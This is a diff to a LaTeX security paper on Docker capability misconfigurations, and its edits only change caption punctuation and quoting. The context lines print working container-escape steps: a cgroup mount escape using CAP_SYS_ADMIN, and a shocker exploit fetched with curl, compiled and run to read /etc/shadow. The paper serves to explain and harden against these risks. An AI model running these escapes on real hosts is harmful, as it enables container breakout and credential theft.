@@ -8,7 +8,7 @@ The CIS Benchmark covers all of these problems in one guideline: 5.3 (Ensure tha
 \subsubsection{\texorpdfstring{\lstinline{CAP_SYS_ADMIN}}{CAP SYS ADMIN}}
 The Docker escape by Felix Wilhelm\cite{Felix-Wilhem-Tweet} needs to be run in privileged mode to work, but it can be rewritten to only need the permission to run \lstinline{mount}\cite{TrailOfBits-Docker-Escape}, which is granted by the \lstinline{CAP_SYS_ADMIN} capability.
 
-\begin{lstlisting}[caption={Docker escape using \lstinline{CAP_SYS_ADMIN}},captionpos=b]
+\begin{lstlisting}[caption={Docker escape using \lstinline{CAP_SYS_ADMIN}.},captionpos=b]
 (host)$ docker run --rm -it --cap-add=CAP_SYS_ADMIN --security-opt apparmor=unconfined ubuntu /bin/bash
 (cont)# mkdir /tmp/cgrp
 (cont)# mount -t cgroup -o rdma cgroup /tmp/cgrp
@@ -30,12 +30,12 @@ Before Docker 1.0.0 \lstinline{CAP_DAC_READ_SEARCH} was added to the default cap
 
 \hfill
 
-\begin{lstlisting}[caption={Docker escape using \lstinline{CAP_DAC_READ_SEARCH}},captionpos=b]
+\begin{lstlisting}[caption={Docker escape using \lstinline{CAP_DAC_READ_SEARCH}.},captionpos=b]
 (host)$ cd /tmp
 (host)$ curl -O http://stealth.openwall.net/xSports/shocker.c
 (host)$ sed -i "s/\/.dockerinit/\/tmp\/a.out/" shocker.c
 (host)$ cc -Wall -std=c99 -O2 shocker.c -static
-(host)$ docker run --rm -it --cap-add="CAP_DAC_READ_SEARCH" -v "/tmp:/tmp" busybox sh
+(host)$ docker run --rm -it --cap-add=CAP_DAC_READ_SEARCH -v /tmp:/tmp busybox sh
 (cont)# /tmp/a.out
 ...
 [!] Win! /etc/shadow output follows:
